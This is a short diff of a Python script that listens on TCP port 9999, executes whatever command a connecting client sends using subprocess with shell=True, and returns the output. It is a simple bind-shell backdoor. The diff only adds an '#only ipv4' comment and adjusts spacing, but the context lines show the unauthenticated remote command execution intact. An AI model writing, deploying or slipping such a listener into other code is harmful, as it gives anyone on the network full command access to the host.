@@ -2,7 +2,7 @@ import socket
 import subprocess
 
 s_PORT   = 9999
-
+#only ipv4
 server=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 
 server.bind((b'',s_PORT))
@@ -22,7 +22,7 @@ while True:
     try:
         #subprocess.getstatusoutput(cmd)
         output=subprocess.check_output(command.decode(),shell=True)
-        if output.decode() =="":
+        if output.decode() == "":
             client.send("no output".encode())
         else:
             client.send(output)
